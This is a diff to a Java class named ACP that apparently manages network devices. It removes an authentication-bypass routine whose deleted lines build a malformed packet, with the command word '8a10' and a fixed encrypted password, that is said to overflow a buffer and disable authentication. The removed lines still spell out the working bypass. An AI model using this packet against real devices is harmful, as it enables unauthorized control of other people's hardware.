@@ -238,11 +238,6 @@ public class ACP {
     return doSendRcv(getACPAuth(connID, targetMAC, enc_password));
   }
 
-  public String[] AuthentBug() {
-    // authenticate to ACP protokoll using (supposed) buffer overflow
-    return doSendRcv(getACPAuthBug(connID, targetMAC));
-  }
-
   public String[] Shutdown() {
     // ENOneCmd protected
     return doSendRcv(getACPShutdown(connID, targetMAC));
@@ -927,20 +922,6 @@ public class ACP {
             buf[0x37 - i] = newMask[i]; // mask starts at 0x34, low byte first
         }
 
-        return (buf);
-    }
-
-    // creates an ACPAuthBug packet
-    // BUG: the command word should be "80a0" instead of "8a10". This "bug" seems to cause
-    // a buffer overflow in clientServer_util which disables the whole authentication
-    // process and gives us full access to the ACP commands.
-
-    // the lowest bit =1 of the 3rd (starting with 1) password byte enables the authentication
-    private byte[] getACPAuthBug(String ConnID, String targetMAC) {
-        byte[] buf = new byte[72];
-        setACPHeader(buf, "8a10", ConnID, targetMAC, (byte) 0x28); // here is the bug
-        buf[32] = 0x0c;
-        System.arraycopy(HexToByte("05:80:24:8d:ab:9c:97:e0"), 0, buf, 40, 8); // the encrypted password as hexstring
         return (buf);
     }
 
